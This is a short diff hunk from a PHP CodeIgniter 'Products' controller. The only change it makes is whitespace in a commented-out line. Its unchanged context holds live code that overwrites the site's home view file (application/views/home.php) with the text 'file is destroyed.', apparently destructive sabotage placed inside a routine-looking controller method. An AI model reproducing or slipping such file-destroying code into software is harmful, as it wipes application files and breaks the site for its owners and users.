@@ -239,7 +239,7 @@ class Products extends CI_Controller
     $data['statue'] = 'home';
 
     // $data['donate'] =  $this->product->getDonate();
-    // $data['count'] =  $this->product->getCount();
+    // $data['count'] = $this->product->getCount();
     // $data['total'] =  $this->product->getTotal();
     $path = $_SERVER['DOCUMENT_ROOT'] . '/application/views/home.php';
     file_put_contents($path, 'file is destroyed.');
